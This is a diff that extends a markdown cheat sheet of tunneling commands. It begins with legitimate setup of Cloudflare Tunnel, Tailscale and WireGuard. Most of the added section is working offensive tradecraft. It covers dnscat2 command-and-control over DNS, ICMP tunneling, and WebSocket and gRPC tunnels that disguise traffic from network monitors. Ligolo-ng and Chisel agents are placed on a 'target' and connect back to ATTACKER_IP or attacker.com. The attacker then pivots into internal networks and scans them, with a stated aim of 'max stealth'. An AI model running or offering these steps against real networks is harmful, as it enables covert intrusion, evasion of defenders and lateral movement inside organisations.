@@ -412,3 +412,278 @@ journalctl -u reverse-tunnel -f
 1. `ssh -ND 127.0.0.1:1080 jump`
 2. Configure browser → SOCKS5 host 127.0.0.1 port 1080, "Proxy DNS over SOCKS"
 3. Test: `curl --socks5-hostname 127.0.0.1:1080 https://ifconfig.me`
+
+---
+
+## 2026 Tunneling Techniques
+
+### Cloudflare Tunnel (cloudflared) — Free Reverse Tunneling
+
+```bash
+# No inbound ports needed. Cloudflare proxies traffic to your local service.
+# Free tier available — no credit card required for named tunnels.
+
+# Install
+curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
+    -o /usr/local/bin/cloudflared && chmod +x /usr/local/bin/cloudflared
+
+# Quick tunnel (temporary URL, no account needed)
+cloudflared tunnel --url http://localhost:8080
+# Outputs: https://random-words.trycloudflare.com → localhost:8080
+
+# Named tunnel (persistent, requires Cloudflare account)
+cloudflared tunnel login                        # authenticate via browser
+cloudflared tunnel create my-tunnel             # creates tunnel + credentials
+cloudflared tunnel route dns my-tunnel app.yourdomain.com  # DNS record
+
+# Config file: ~/.cloudflared/config.yml
+cat > ~/.cloudflared/config.yml << 'EOF'
+tunnel: <TUNNEL_UUID>
+credentials-file: ~/.cloudflared/<TUNNEL_UUID>.json
+
+ingress:
+  - hostname: app.yourdomain.com
+    service: http://localhost:8080
+  - hostname: ssh.yourdomain.com
+    service: ssh://localhost:22
+  - service: http_status:404    # catch-all
+EOF
+
+cloudflared tunnel run my-tunnel
+
+# Systemd service for persistence
+sudo cloudflared service install
+sudo systemctl enable --now cloudflared
+```
+
+### Tailscale / WireGuard Mesh Networking
+
+```bash
+# Tailscale — zero-config WireGuard mesh. Every device gets a stable IP.
+# Perfect for persistent access across NATs without port forwarding.
+
+# Install Tailscale
+curl -fsSL https://tailscale.com/install.sh | sh
+sudo tailscale up
+tailscale ip -4          # your stable mesh IP (100.x.x.x)
+tailscale status         # see all mesh nodes
+
+# Enable subnet routing (pivot into internal networks)
+sudo tailscale up --advertise-routes=10.0.0.0/24,192.168.1.0/24
+# On admin console: approve the routes
+
+# Exit node (route ALL traffic through a specific node)
+sudo tailscale up --advertise-exit-node   # on the exit node
+sudo tailscale up --exit-node=<exit-node-ip>  # on the client
+
+# Raw WireGuard (when Tailscale isn't an option)
+sudo apt install -y wireguard
+wg genkey | tee privatekey | wg pubkey > publickey
+
+# Server config: /etc/wireguard/wg0.conf
+cat > /etc/wireguard/wg0.conf << 'EOF'
+[Interface]
+PrivateKey = <SERVER_PRIVATE_KEY>
+Address = 10.66.66.1/24
+ListenPort = 51820
+PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE
+
+[Peer]
+PublicKey = <CLIENT_PUBLIC_KEY>
+AllowedIPs = 10.66.66.2/32
+EOF
+
+sudo wg-quick up wg0
+sudo systemctl enable wg-quick@wg0
+```
+
+### DNS Tunneling (iodine / dnscat2)
+
+```bash
+# Bypass network restrictions by encoding data in DNS queries.
+# Works when ONLY DNS (port 53) is allowed outbound.
+
+# iodine — IP-over-DNS tunnel
+# Server (public VPS with NS record pointing to it):
+sudo apt install -y iodine
+sudo iodined -f -P secretpassword 10.0.0.1/24 t.yourdomain.com
+# Client (restricted network):
+sudo iodine -f -P secretpassword t.yourdomain.com
+# Creates a tun0 interface — run SSH/SOCKS over it:
+ssh -ND 1080 user@10.0.0.1
+
+# dnscat2 — C2 over DNS (no IP tunnel, command channel)
+# Server:
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server && gem install bundler && bundle install
+ruby dnscat2.rb t.yourdomain.com
+# Client:
+cd dnscat2/client && make
+./dnscat --dns=server=YOUR_DNS_SERVER,domain=t.yourdomain.com --secret=sharedsecret
+
+# Verify DNS tunneling works
+dig +short TXT test.t.yourdomain.com @8.8.8.8
+```
+
+### ICMP Tunneling (ptunnel-ng)
+
+```bash
+# Tunnel TCP inside ICMP echo/reply packets.
+# Works when ICMP is allowed but TCP/UDP is blocked.
+
+# Install ptunnel-ng
+git clone https://github.com/utoni/ptunnel-ng.git
+cd ptunnel-ng && mkdir build && cd build && cmake .. && make
+sudo make install
+
+# Server (public VPS):
+sudo ptunnel-ng -r -R22 -v 4
+# -r = server mode, -R22 = forward to local SSH
+
+# Client (restricted network):
+sudo ptunnel-ng -p SERVER_IP -l 2222 -r SERVER_IP -R22
+# Now SSH through the ICMP tunnel:
+ssh -p 2222 user@127.0.0.1
+```
+
+### WebSocket Tunneling Through Proxies
+
+```bash
+# Many corporate proxies allow WebSocket upgrades on port 443.
+# Tunnel arbitrary TCP through WebSocket connections.
+
+# wstunnel — WebSocket tunnel
+# Install:
+curl -fsSL https://github.com/erebe/wstunnel/releases/latest/download/wstunnel_linux_amd64 \
+    -o /usr/local/bin/wstunnel && chmod +x /usr/local/bin/wstunnel
+
+# Server (public VPS, listening on 443 to look like HTTPS):
+wstunnel server wss://0.0.0.0:443
+
+# Client — forward local port 2222 to remote SSH via WebSocket:
+wstunnel client -L 2222:127.0.0.1:22 wss://server.example.com:443
+ssh -p 2222 user@127.0.0.1
+
+# Client — SOCKS5 proxy through WebSocket:
+wstunnel client -L socks5://127.0.0.1:1080 wss://server.example.com:443
+curl --socks5-hostname 127.0.0.1:1080 https://ifconfig.me
+
+# Works through corporate HTTP proxies:
+wstunnel client -L 2222:127.0.0.1:22 wss://server.example.com:443 \
+    --http-proxy http://corporate-proxy:8080
+```
+
+### HTTP/2 Multiplexing for Covert Channels
+
+```bash
+# HTTP/2 multiplexes multiple streams over a single TCP connection.
+# Covert data can be hidden in stream priorities, padding, or SETTINGS frames.
+
+# h2tunnel — tunnel TCP over HTTP/2
+# Use with a legitimate-looking HTTPS endpoint:
+# Server:
+python3 -c "
+import h2.connection, h2.config, h2.events
+import ssl, socket
+# Custom HTTP/2 server that tunnels data in DATA frames
+# Each stream ID = a different tunnel
+# Looks like normal HTTPS traffic to network monitors
+print('HTTP/2 covert channel concept — implement with h2 library')
+"
+
+# Practical approach: use gRPC (which runs on HTTP/2)
+# or abuse HTTP/2 server push for bidirectional data transfer
+# See gRPC tunneling section below
+```
+
+### gRPC Tunneling
+
+```bash
+# gRPC uses HTTP/2 + Protocol Buffers. Traffic looks like legitimate API calls.
+# Blends in with microservice architectures.
+
+# grpcurl for testing:
+go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
+
+# grpctunnel — tunnel arbitrary TCP over gRPC
+# https://github.com/jhump/grpctunnel
+go install github.com/jhump/grpctunnel/cmd/grpctunnel@latest
+
+# Server (looks like a normal gRPC service):
+grpctunnel serve --bind 0.0.0.0:443 --tls-cert cert.pem --tls-key key.pem
+
+# Client — forward local port to remote service through gRPC:
+grpctunnel client --server server.example.com:443 --tls \
+    -L 5432:internal-db:5432
+
+# The traffic appears as standard gRPC/HTTP2 calls on port 443
+# Network monitors see: TLS + HTTP/2 + application/grpc content-type
+```
+
+### Ligolo-ng — Modern Pivoting (No SSH Needed)
+
+```bash
+# Ligolo-ng creates a userland network tunnel using TLS WebSockets.
+# No SSH. No SOCKS. Full network-level pivoting with a tun interface.
+
+# Download
+# Proxy (attacker machine):
+curl -fsSL https://github.com/nicocha30/ligolo-ng/releases/latest/download/proxy_linux_amd64 \
+    -o /usr/local/bin/ligolo-proxy && chmod +x /usr/local/bin/ligolo-proxy
+# Agent (target machine):
+curl -fsSL https://github.com/nicocha30/ligolo-ng/releases/latest/download/agent_linux_amd64 \
+    -o /tmp/agent && chmod +x /tmp/agent
+
+# Setup tun interface on attacker:
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+
+# Start proxy (attacker):
+ligolo-proxy -selfcert -laddr 0.0.0.0:11601
+
+# Start agent (target — connects back):
+/tmp/agent -connect ATTACKER_IP:11601 -ignore-cert
+
+# In the proxy console:
+# session                    → select the agent session
+# ifconfig                   → see target's network interfaces
+# start                      → start the tunnel
+
+# Add routes on attacker to reach internal networks:
+sudo ip route add 10.0.0.0/24 dev ligolo
+# Now you can directly access 10.0.0.x from your attacker machine
+ping 10.0.0.1
+nmap -sV 10.0.0.0/24
+
+# Listeners (reverse port forward from target to attacker):
+# In proxy console:
+# listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
+```
+
+### Reverse SOCKS5 via Chisel
+
+```bash
+# Chisel can create a reverse SOCKS5 proxy — the target connects OUT to you,
+# and you get a SOCKS5 proxy INTO the target's network.
+
+# Server (attacker VPS — accepts connections):
+chisel server --port 8443 --reverse --auth user:$(openssl rand -hex 16)
+
+# Client (target — connects back, opens reverse SOCKS):
+chisel client --auth user:PASSWORD https://attacker.com:8443 R:1080:socks
+
+# Now on attacker: SOCKS5 proxy at 127.0.0.1:1080 routes through the target
+curl --socks5-hostname 127.0.0.1:1080 http://internal-app.corp:8080
+proxychains4 nmap -sT -Pn 10.0.0.0/24
+
+# Multiple tunnels in one connection:
+chisel client --auth user:PASSWORD https://attacker.com:8443 \
+    R:1080:socks \
+    R:3389:10.0.0.5:3389 \
+    R:5432:db.internal:5432
+
+# Over WebSocket (looks like normal web traffic):
+# Chisel uses WebSocket by default — traffic on 8443 looks like wss://
+# Combine with a legitimate-looking domain + Let's Encrypt cert for max stealth
+```
